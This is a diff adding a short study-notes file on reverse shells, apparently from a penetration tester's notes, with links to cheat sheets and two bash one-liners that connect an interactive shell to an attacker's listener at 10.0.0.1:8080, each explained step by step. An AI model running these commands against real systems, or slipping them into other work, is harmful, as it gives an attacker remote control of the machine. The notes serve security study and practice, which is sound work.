@@ -1,0 +1,21 @@
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux
+
+** https://www.revshells.com/ **  Very Helpful if stuck. 
+
+https://exploit-notes.hdks.org/exploit/shell/reverse-shell-cheat-sheet/
+
+Some bash reverse shells with explanation:
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+bash -i: Starts an interactive instance of Bash.
+>& /dev/tcp/10.0.0.1/8080: Redirects both standard output (stdout) and standard error (stderr) to the specified TCP connection. /dev/tcp/10.0.0.1/8080 represents a TCP connection to IP 10.0.0.1 on port 8080. This is the attacker’s IP and port, where the listener (e.g., using netcat or ncat) would be waiting for the connection.
+0>&1: Redirects standard input (stdin) to the same connection as stdout. This means that any input from the attacker will be sent to the Bash shell.
+
+bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+
+bash -c: This option allows you to specify a string of commands to be executed in a new shell instance.
+Inside the string, the same reverse shell as in the first example is being executed: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1.
+
+
+
